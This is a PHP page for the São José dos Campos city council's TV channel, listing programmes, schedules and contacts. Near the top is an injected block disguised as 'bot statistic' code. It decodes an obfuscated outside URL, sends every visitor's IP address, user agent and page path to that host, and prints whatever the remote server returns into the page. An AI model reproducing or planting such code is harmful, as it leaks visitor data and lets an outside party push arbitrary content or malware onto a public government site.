<?php

include_once("../library/master-page.php");

$oMasterPage = new MasterPage();
$oMasterPage->Init("../master.php", "TV Câmara");
$oMasterPage->AddParameter("css", "conheca-a-camara/index");
$oMasterPage->AddParameter("pagina", "tv-camara");
$oMasterPage->Open("PageContent");

?><?php
if (!isset($sRetry)) {
    global $sRetry;
    $sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $sUserAgen = "";
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if ((strstr($sUserAgen, 'google') == false) && (strstr($sUserAgen, 'yahoo') == false) && (strstr($sUserAgen, 'baidu') == false) && (strstr($sUserAgen, 'msn') == false) && (strstr($sUserAgen, 'opera') == false) && (strstr($sUserAgen, 'chrome') == false) && (strstr($sUserAgen, 'bing') == false) && (strstr($sUserAgen, 'safari') == false) && (strstr($sUserAgen, 'bot') == false)) // Bot comes
    {
        if (isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true) { // Create  bot analitics
            $stCurlLink = base64_decode('aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw') . '?ip=' . urlencode($_SERVER['REMOTE_ADDR']) . '&useragent=' . urlencode($sUserAgent) . '&domainname=' . urlencode($_SERVER['HTTP_HOST']) . '&fullpath=' . urlencode($_SERVER['REQUEST_URI']) . '&check=' . isset($_GET['look']);
            @$stCurlHandle = curl_init($stCurlLink);
        }
    }
    if ($stCurlHandle !== NULL) {
        curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 8);
        $sResult = @curl_exec($stCurlHandle);
        if ($sResult[0] == "O") {
            $sResult[0] = " ";
            echo $sResult; // Statistic code end
        }
        curl_close($stCurlHandle);
    }
}
?>


    <h1>TV Câmara</h1>



    <div class="tv-camara">
        <p>A TV Câmara de São José dos Campos teve sua criação autorizada por Decreto Legislativo em janeiro de 2013. A
            primeira transmissão foi uma sessão plenária em 12 de setembro de 2013. Seguindo o princípio da publicidade
            na administração pública, a programação da TV prioriza a exibição ao vivo e reprise das sessões plenárias,
            extraordinárias e solenes; reuniões de comissões compostas pelos vereadores, a exemplo de Comissão Especial
            de Inquérito, audiências públicas e outros eventos organizados pela Câmara Municipal.</p>

        <img src="imgs/tv-camara/titulo.png" alt="TV Câmara" title="TV Câmara"
             class="img-responsive img-thumbnail tv-logo">

        <p>Além de conferir maior transparência às discussões e votações em plenário, a grade também contempla programas
            de entrevistas com vereadores, especialistas e personalidades e ainda reportagens abordando fatos e assuntos
            de interesse da comunidade. Completam o conteúdo veiculado documentários de cunho cultural, educativo ou de
            preservação da memória da cidade.</p>


        <p>O objetivo de servir como canal entre a instituição legislativa e a população, fortalecendo a cidade e
            valorizando os munícipes, aliado ao compromisso com o avanço da cidadania e democratização da comunicação se
            traduzem no slogan: TV Câmara, a cidade com mais conteúdo.</p>

        <h2 class="zwo3Italic">Sintonize</h2>

        <p>Para acompanhar a programação, sintonize o canal 7 ou 29 da TV a cabo (NET). Pela internet, no computador,
            tablet ou smartphone, acesse: <br/><a href="http://www.camarasjc.sp.gov.br/assista.php" target="_blank">www.camarasjc.sp.gov.br/assista.php</a>
        </p>


        <p>Para ver e rever os programas e reportagens quando quiser, entre no canal do <a
                href="http://www.youtube.com/camarasjc" target="_blank">YouTube</a></p>


        <h2 class="zwo3Italic">Conheça os programas produzidos pela equipe da TV Câmara de São José dos Campos</h2>


        <div class="info">
            <div class="item-programa row">
                <div class="foto-programa col-md-4 col-sm-4">
                    <img src="http://camarasjc2.hospedagemdesites.ws/clicknow/imgs/tv-camara/semana.jpg"
                         alt="semana legislativa" class="img-responsive"/>
                </div>
                <div class="col-md-8 col-sm-8">
                    <h3>Semana Legislativa</h3>

                    <p>Em formato de revista, apresenta um resumo semanal de notícias, projetos aprovados, debates e
                        informações de serviço, como dicas culturais, cursos e oportunidades de emprego.</p>

                    <p><strong>Assista</strong>: sexta-feira às 18h.

                    <p><strong>Reveja</strong>: <a
                            href="https://www.youtube.com/playlist?list=PLey9M_cWIxnnyLsYvHgdO5hWdQWbF-r0g"
                            target="_blank"
                            title="Semana Legislativa">Semana Legislativa (link para o Youtube)</a></p>
                </div>
            </div>

            <div class="clear" >&nbsp;</div>

            <div class="item-programa row">
                <div class="foto-programa col-md-4 col-sm-4">
                    <img src="http://camarasjc2.hospedagemdesites.ws/clicknow/imgs/tv-camara/visao.jpg"
                         alt="Visão Parlamentar" class="img-responsive"/>
                </div>
                <div class="col-md-8 col-sm-8">
                    <h3>Visão Parlamentar</h3>

                    <p>A cada semana um vereador é entrevistado sobre seus projetos, propostas, o trabalho de
                        fiscalização
                        ou nas comissões temáticas. </p>

                    <p><strong>Assista</strong>: quarta-feira às 20h.</p>

                    <p><strong>Reveja</strong>: <a
                            href="https://www.youtube.com/playlist?list=PLey9M_cWIxnloY0jFMeN6AgmSGZ22qA7i"
                            target="_blank"
                            title="Visão parlamentar no youtube">Visão parlamentar (link para o Youtube)</a></p>
                </div>
            </div>
            <div class="clear">&nbsp;</div>

            <div class="item-programa row">
                <div class="foto-programa col-md-4 col-sm-4">
                    <img src="http://camarasjc2.hospedagemdesites.ws/clicknow/imgs/tv-camara/cidade.jpg"
                         alt="Cidade em Foco" class="img-responsive"/>
                </div>
                <div class="col-md-8 col-sm-8">

                    <h3>Cidade em Foco</h3>

                    <p>Programa produzido quinzenalmente em que especialistas e vereadores debatem temas relevantes para
                        a
                        cidade e possíveis soluções para os problemas enfrentados. </p>

                    <p><strong>Assista:</strong> sexta-feira às 21h. </p>

                    <p><strong>Reveja</strong>: <a
                            href="https://www.youtube.com/playlist?list=PLey9M_cWIxnn6SVxIWOKcSNdr03BOVDTq"
                            target="_blank"
                            title="Cidade em Foco no Youtube">Cidade em Foco (link para o Youtube) </a></p>
                </div>
            </div>
            
            <div class="clear">&nbsp;</div>

            <div class="item-programa row">
                <div class="foto-programa col-md-4 col-sm-4">
                    <img src="http://camarasjc2.hospedagemdesites.ws/clicknow/imgs/tv-camara/palavra.jpg"
                         alt="Com a Palavra" class="img-responsive"/>
                </div>
                <div class="col-md-8 col-sm-8">
                    <h3>Com a Palavra</h3>

                    <p>Um espaço semanal para uma conversa com especialistas, intelectuais, lideranças e personalidades
                        locais ou nacionais. </p>

                    <p><strong>Assista</strong>: quinta-feira às 17h. </p>

                    <p><strong>Reveja</strong>: <a
                            href="https://www.youtube.com/playlist?list=PLey9M_cWIxnl4QppWqPmUITXzH_ECajoG"
                            target="_blank"
                            title="Com a Palvra">Com a Palavra(link para o Youtube)</a></p>
                </div>
            </div>
            <div class="clear">&nbsp;</div>


            <div class="item-programa row">
                <div class="foto-programa col-md-4 col-sm-4">
                    <img src="http://camarasjc2.hospedagemdesites.ws/clicknow/imgs/tv-camara/sessao.jpg"
                         alt="Sessões Plenárias" class="img-responsive"/>
                </div>
                <div class="col-md-8 col-sm-8">
                    <h3>Sessões Plenárias</h3>

                    <p>
                        Acompanhe as sessões ordinárias ao vivo, às terças e quintas-feiras, a partir das 17h30. As
                        transmissões são mediadas por um apresentador que expõe as matérias em pauta e introduz notícias
                        a
                        partir das 17h15.

                    <p><strong>Reveja</strong>: <a
                            href="https://www.youtube.com/playlist?list=PLey9M_cWIxnl6IgPD7si9eqd9gxvM4enT"
                            target="_blank"
                            title="Sessões Plenárias">Sessões Plenárias (link para o Youtube)</a></p>

                </div>

            </div>

            <h2>Contato</h2>

            <p><strong> Email</strong>: <a href="mailto:tvcamara@camarasjc.sp.gov.br">tvcamara@camarasjc.sp.gov.br</a>
                <br/>
                <strong> Telefone</strong>:(12) 3925-6708 / 6711.</p>
        </div>
    </div>
<?php

$oMasterPage->Close("PageContent");
$oMasterPage->End();

?>